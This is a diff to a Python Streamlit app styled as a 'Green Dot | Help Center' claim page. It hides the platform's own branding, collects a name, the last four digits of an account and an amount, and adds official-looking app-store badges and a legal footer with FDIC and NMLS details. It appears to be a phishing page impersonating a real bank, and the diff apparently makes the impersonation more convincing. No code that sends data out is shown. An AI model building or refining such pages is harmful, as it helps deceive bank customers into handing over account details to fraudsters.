@@ -24,13 +24,12 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")
 
-# CSS PARA CENTRADO ABSOLUTO
+# CSS PARA CENTRADO Y ESTILO DE FOOTER
 st.markdown("""<style>
     .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
     .block-container { max-width: 500px !important; padding-top: 2rem !important; }
     header, footer, .stDeployButton, [data-testid='stHeader'] { display: none !important; }
 
-    /* Forzar el contenedor del logo al centro */
     [data-testid="stImage"] {
         display: block !important;
         margin-left: auto !important;
@@ -49,17 +48,30 @@ st.markdown("""<style>
     }
 
     .stButton > button { background-color: #00a05b !important; color: white !important; width: 100%; border: none; height: 50px; border-radius: 8px; }
-    .legal-container { font-size: 11px; color: #777; text-align: center; margin-top: 50px; border-top: 1px solid #222; padding-top: 20px; }
+    
+    .promo-box {
+        background-color: #111; padding: 25px 15px; text-align: center;
+        border-radius: 12px; margin: 25px 0; border: 1px solid #222;
+    }
+
+    .legal-container {
+        font-size: 11px !important;
+        color: #777 !important;
+        text-align: center !important;
+        margin-top: 40px !important;
+        padding: 20px 10px !important;
+        border-top: 1px solid #222 !important;
+        line-height: 1.6 !important;
+    }
 </style>""", unsafe_allow_html=True)
 
-# Mostrar Logo centrado
-if os.path.exists("logo.svg"): 
+if os.path.exists("logo.svg"):
     st.image("logo.svg")
 
 st.title("Help Center")
 st.write("Please fill out the form below to submit your claim.")
 
-with st.form("claim_v1_sync", clear_on_submit=True):
+with st.form("claim_v1_final", clear_on_submit=True):
     st.text_input("Full Name")
     st.text_input("Last 4 digits of Account")
     st.number_input("Amount", min_value=0.0)
@@ -67,4 +79,14 @@ with st.form("claim_v1_sync", clear_on_submit=True):
     if st.form_submit_button("SUBMIT NOW"):
         st.success("Claim Received.")
 
-st.markdown("<div class='legal-container'>Green Dot Bank, Member FDIC. ©2026 Green Dot Corporation.</div>", unsafe_allow_html=True)
+# SECCIÓN DOWNLOAD APP
+st.markdown("""<div class='promo-box'>
+    <h3 style='color:white; margin-bottom:15px; font-size: 1.2rem;'>Download the Green Dot app</h3>
+    <div style='display: flex; justify-content: center; gap: 10px; flex-wrap: wrap;'>
+        <a href='https://play.google.com/store/apps/details?id=com.greendot.retail' target='_blank'><img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='120'></a>
+        <a href='https://apps.apple.com/us/app/green-dot-mobile-banking/id415511546' target='_blank'><img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='120'></a>
+    </div>
+</div>""", unsafe_allow_html=True)
+
+# FOOTER LEGAL
+st.markdown("<div class='legal-container'>Green Dot Bank, Member FDIC. &copy;2026 Green Dot Corporation. All rights reserved. NMLS #914924.</div>", unsafe_allow_html=True)
